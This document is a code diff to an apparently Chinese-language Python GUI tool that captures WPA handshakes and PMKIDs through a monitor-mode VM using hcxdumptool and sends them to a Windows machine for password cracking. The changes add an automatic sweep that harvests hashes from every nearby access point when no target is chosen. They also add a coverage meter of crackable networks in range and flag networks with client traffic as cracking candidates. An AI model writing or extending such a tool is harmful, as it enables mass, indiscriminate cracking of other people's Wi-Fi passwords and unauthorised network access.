@@ -10,7 +10,7 @@ mac_wifi_app_v2.py — 一選就跑
 """
 import tkinter as tk
 from tkinter import ttk
-import subprocess, threading, time, json, re, os, glob, urllib.request, signal, queue
+import subprocess, threading, time, json, re, os, glob, urllib.request, signal, queue, shlex
 
 # ---------------- fixed paths (Mac side) ----------------
 QEMU_BIN = '/opt/homebrew/bin/qemu-system-aarch64'
@@ -76,6 +76,7 @@ class App:
         self._running = threading.Event()
         self.aps = []          # [(ssid, bssid, ch, sig)]
         self.target = None     # (ssid, bssid, ch)
+        self._cap_lock = threading.Lock()
         self.hash_pool = set() # hashes for current target
         self.phase = ('idle', '等待選定 Wi-Fi')
         self._boot_lock = threading.Lock()
@@ -298,10 +299,10 @@ class App:
         return {'scan': '選定', 'cap': '抓包', 'conv': '轉換握手包 + 上傳',
                 'crack': 'Windows 破解中'}.get(k, k)
 
-    def set_phase(self, key, text, sub=''):
+    def set_phase(self, key, text, sub='', color=None):
         self.phase = (key, text)
         if hasattr(self, 'phases'):
-            self._ui(lambda: self.phases.get(key, tk.Label()).config(fg=C_ACC))
+            self._ui(lambda: self.phases.get(key, tk.Label()).config(fg=color or C_ACC))
         if sub:
             self._ui(lambda: self._set_text(self.phases[key + '_sub'], sub))
         self._log('[%s] %s' % (self._phase_name(key), sub or text))
@@ -495,7 +496,10 @@ class App:
         try:
             r = subprocess.run(VM_SSH.split() + ['echo VMOK'],
                                capture_output=True, timeout=timeout)
-            return b'VMOK' in (r.stdout or b'')
+            if b'VMOK' in (r.stdout or b''):
+                self._vm_up_once = True
+                return True
+            return False
         except Exception:
             return False
 
@@ -611,6 +615,11 @@ class App:
     def _scan_loop(self):
         miss = 0
         while not self._stop.is_set():
+            if (not self.target and not self._running.is_set()
+                    and not getattr(self, '_sweep_on', False)
+                    and getattr(self, '_vm_up_once', False)):
+                self._sweep_on = True
+                threading.Thread(target=self._sweep_loop, daemon=True).start()
             if self._running.is_set():
                 time.sleep(3)
                 continue
@@ -665,16 +674,17 @@ class App:
                   CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                   CH + 'ifconfig wlan0 up 2>/dev/null\nsleep 1\n' +
-                  'for ch in 1 6 11; do\n' +
+                  'for ch in 1 2 3 4 5 6 7 8 9 10 11 12 13 14; do\n' +
                   CH + '  /usr/sbin/iw dev wlan0 set channel $ch 2>/dev/null\n' +
                   CH + '  rm -f /tmp/bc_$ch.pcap\n' +
-                  CH + '  timeout 3 /usr/bin/tcpdump -i wlan0 -s 160 -w /tmp/bc_$ch.pcap 2>/dev/null\n' +
+                  CH + '  timeout 2.5 /usr/bin/tcpdump -i wlan0 -s 160 -w /tmp/bc_$ch.pcap 2>/dev/null\n' +
                   '  echo "MARK:$ch"\n' +
                   CH + '  /usr/bin/tcpdump -r /tmp/bc_$ch.pcap -e -n 2>/dev/null\n' +
                   'done\n')
         try:
-            r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
-                               capture_output=True, timeout=45)
+            with self._cap_lock:
+                r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
+                                   capture_output=True, timeout=240)
             out = (r.stdout or b'').decode('utf-8', 'replace')
             aps = self._parse_scan(out)
             now = time.time()
@@ -695,14 +705,19 @@ class App:
                     at = ''
                 if at:
                     for t in aps:
-                        if t[1] == at or t[0] == at:
+                        if t[1] == at or t[0] == at or at.lower() in t[0].lower():
                             self.target = (t[0], t[1], t[2])
+                            self._tgt_miss = 0
                             self._log('🎯 自動選定(測試): %s' % t[0])
                             threading.Thread(
                                 target=self._auto_loop,
                                 args=(t[0], t[1], t[2]),
                                 daemon=True).start()
                             break
+            if (not self.target and not self._running.is_set()
+                    and not getattr(self, '_sweep_on', False)):
+                self._sweep_on = True
+                threading.Thread(target=self._sweep_loop, daemon=True).start()
             self._refresh_tree()
             self._ui(lambda: self.lbl_scan.config(
                 text='📡 %s · %d AP' % (time.strftime('%H:%M:%S'), len(aps)),
@@ -806,10 +821,33 @@ class App:
         self._known_cache = (now, data)
         return data
 
+    def _traffic_bssids(self):
+        # 曾出現 hash 的 BSSID = 有客戶端流量 = 可破候選
+        out = set()
+        for l in self.hash_pool:
+            f = l.split('*')
+            if len(f) > 3:
+                out.add(f[3].lower())
+        try:
+            for p in glob.glob(os.path.join(HASHSTORE, '*.22000')):
+                try:
+                    with open(p) as f:
+                        for l in f:
+                            fs = l.split('*')
+                            if len(fs) > 3:
+                                out.add(fs[3].lower())
+                except OSError:
+                    pass
+        except Exception:
+            pass
+        return out
+
     def _refresh_tree(self):
-        if list(self.aps) == getattr(self, '_last_aps', None):
+        traffic = self._traffic_bssids()
+        key = (list(self.aps), frozenset(traffic))
+        if key == getattr(self, '_last_aps', None):
             return
-        self._last_aps = list(self.aps)
+        self._last_aps = key
         cracked, captured = self._known()
         for tag, col in (('s4', '#34d399'), ('s3', '#a3e635'),
                          ('s2', '#fbbf24'), ('s1', '#f87171')):
@@ -821,6 +859,8 @@ class App:
                     stat = '🔓 已破解'
                 elif ssid in captured:
                     stat = '📦 已抓包'
+                elif bssid.lower() in traffic:
+                    stat = '🟢 有流量'
                 else:
                     stat = ''
                 try:
@@ -848,6 +888,7 @@ class App:
             return
         ssid, bssid, ch, sig = self.aps[idx]
         self.target = (ssid, bssid, ch)
+        self._tgt_miss = 0
         self._ui(lambda: self.lbl_target.config(
             text='%s' % ssid, fg=C_TEXT))
         self._ui(lambda: self.lbl_target_sub.config(
@@ -907,6 +948,74 @@ class App:
         finally:
             self._running.clear()
 
+    def _coverage(self):
+        scan = set()
+        for (_s, b, _c, g) in self.aps:
+            try:
+                if int(g) >= -75:
+                    scan.add(b.lower())
+            except (TypeError, ValueError):
+                pass
+        if not scan:
+            return 0.0, 0, 0
+        hit = len(scan & self._traffic_bssids())
+        return 100.0 * hit / len(scan), hit, len(scan)
+
+    def _sweep_round(self, ch):
+        dur = 140
+        script = (BIND +
+                  CH + 'rm -f /tmp/sw /tmp/sw.22000 2>/dev/null\n' +
+                  CH + 'ifconfig wlan0 down 2>/dev/null\n' +
+                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
+                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
+                  CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 2\n' % ch +
+                  'timeout %d ' % dur +
+                  CH + 'hcxdumptool -i wlan0 -w /tmp/sw -t 10 --rds=2 2>/dev/null\n' +
+                  CH + 'hcxpcapngtool -o /tmp/sw.22000 /tmp/sw 2>/dev/null\n' +
+                  CH + 'cat /tmp/sw.22000 2>/dev/null\n')
+        try:
+            with self._cap_lock:
+                r = subprocess.run(VM_SSH.split() + ['sh', '-s'],
+                                   input=script.encode(), capture_output=True,
+                                   timeout=dur + 60)
+            out = (r.stdout or b'').decode('utf-8', 'replace')
+        except Exception as e:
+            self._ev('sweep', 'ch=%s err=%r' % (ch, e))
+            return 0
+        lines = [l.strip() for l in out.splitlines() if l.startswith('WPA*')]
+        pth = os.path.join(HASHSTORE, 'sweep_all.22000')
+        seen = set()
+        try:
+            with open(pth) as f:
+                seen = {x.strip() for x in f}
+        except OSError:
+            pass
+        new = [l for l in lines if l not in seen]
+        if new:
+            os.makedirs(HASHSTORE, exist_ok=True)
+            with open(pth, 'a') as f:
+                f.write('\n'.join(new) + '\n')
+            self.hash_pool.update(new)
+        self._ev('sweep', 'ch=%s new=%d' % (ch, len(new)))
+        return len(new)
+
+    def _sweep_loop(self):
+        try:
+            while not self._stop.is_set() and not self.target:
+                if self._stop.is_set() or self.target:
+                    break
+                try:
+                    self._sweep_round('hop')
+                    cov, hit, tot = self._coverage()
+                    self._ev('cov', 'pct=%.0f hit=%d tot=%d' % (cov, hit, tot))
+                    self.set_phase('scan', '巡掃全頻道（無目標自動收 hash）',
+                                   '🎯 可達覆蓋 %.0f%%（%d/%d）' % (cov, hit, tot))
+                except Exception as e:
+                    self._ev('sweep', 'loop err=%r' % e)
+                time.sleep(3)
+        finally:
+            self._sweep_on = False
+
     def _round(self, rnd, ssid, bssid, ch, wip, port, dur):
         if not self.boot_vm_if_needed():
             self.set_phase('cap', '虛擬機未就緒，等待...', '重試中')
@@ -920,10 +1029,11 @@ class App:
 CH + 'sh -c "rm -f /tmp/scan_*" 2>/dev/null\n' +
 CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
-                  CH + 'ifconfig wlan0 up 2>/dev/null\nsleep 3\n' +
+                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
+                  CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 3\n' % ch +
                   'timeout %d ' % dur +
-                  CH + 'hcxdumptool -i wlan0 -w /tmp/scan_%d ' % rnd +
-                  '' + str(ch) + 'a -t 7 --rds=2 2>&1 | tail -15\n' +
+                   CH + 'hcxdumptool -i wlan0 -w /tmp/scan_%d '
+                        '-t 7 --rds=2 2>&1 | tail -15\n' % rnd +
                   'echo "===CONVERT==="\n' +
                   CH + 'hcxpcapngtool -o /tmp/scan_%d.22000 /tmp/scan_%d '
                        '2>&1 | tail -4\n' % (rnd, rnd) +
@@ -933,8 +1043,9 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   'echo "===RAWCOUNT==="\n' +
                   CH + 'grep -cv "^#" /tmp/scan_%d.22000 2>/dev/null\n' % rnd)
         t0 = time.time()
-        r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
-                           capture_output=True, timeout=dur + 150)
+        with self._cap_lock:
+            r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
+                               capture_output=True, timeout=dur + 150)
         out = (r.stdout or b'').decode('utf-8', 'replace') + \
               (r.stderr or b'').decode('utf-8', 'replace')
         self._ev('cap', 'round=%d rc=%s dur=%.1fs out=%dB' % (
@@ -979,6 +1090,14 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                     self._log('   抓包器: %s' % l.strip()[:110])
             if raw != 0:
                 # 抓包器正常（有其他 AP 的 hash），只是目標 AP 安靜 — 不算失敗
+                miss = getattr(self, '_tgt_miss', 0) + 1
+                self._tgt_miss = miss
+                if miss >= 5:
+                    self.set_phase('cap',
+                        '⚠️ %s 連續 %d 輪無握手包' % (ssid, miss),
+                        '這 AP 可能沒有裝置在連 — 換一個有流量的 AP 試試',
+                        C_RED)
+                    self._ev('tgtmiss', 'ssid=%s miss=%d raw=%d' % (ssid, miss, raw))
                 time.sleep(3)
                 return
             self._ev('capfail', 'round=%d capout=%r' % (
@@ -999,6 +1118,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                 time.sleep(3)
             return
         self._cap_streak = 0
+        self._tgt_miss = 0
         # ---- 3. post (Windows 決定: 秒回 / 自動解 / 掛起待確認) ----
         status, pw = self._post(self._target_lines(), ssid, bssid, wip, port)
         if status is False:
